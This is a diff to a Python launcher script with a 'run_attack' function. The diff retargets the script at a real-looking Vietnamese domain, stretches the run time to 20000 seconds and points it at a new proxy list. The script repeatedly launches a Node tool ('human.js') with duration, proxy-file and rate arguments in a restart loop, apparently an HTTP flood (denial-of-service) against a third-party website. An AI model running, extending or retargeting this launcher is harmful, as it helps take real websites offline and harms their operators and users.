@@ -5,9 +5,9 @@ import os
 import signal
 
 # --- Configuration ---
-URL = "https://bensgaming.click/"
-TIME_LIMIT = 120
-PROXY_FILE = "proxies.txt"
+URL = "https://hoangdieust.vn/"
+TIME_LIMIT = 20000
+PROXY_FILE = "abc.txt"
 
 def check_file_exists(filename):
     if not os.path.isfile(filename):
@@ -24,7 +24,7 @@ def run_attack():
 
         try:
             print(f"Starting new process on URL: {URL}")
-            cmd = ["node", "nv2.js", URL, "130", PROXY_FILE, "8", "821"]
+            cmd = ["node", "human.js", URL, "21600", PROXY_FILE, "8", "821"]
             process = subprocess.Popen(cmd)           
             time.sleep(TIME_LIMIT)            
             if process.poll() is None:
@@ -39,4 +39,5 @@ def run_attack():
         print("Waiting 2 seconds before restart...")
         time.sleep(1)
 if __name__ == "__main__":
+
     run_attack()
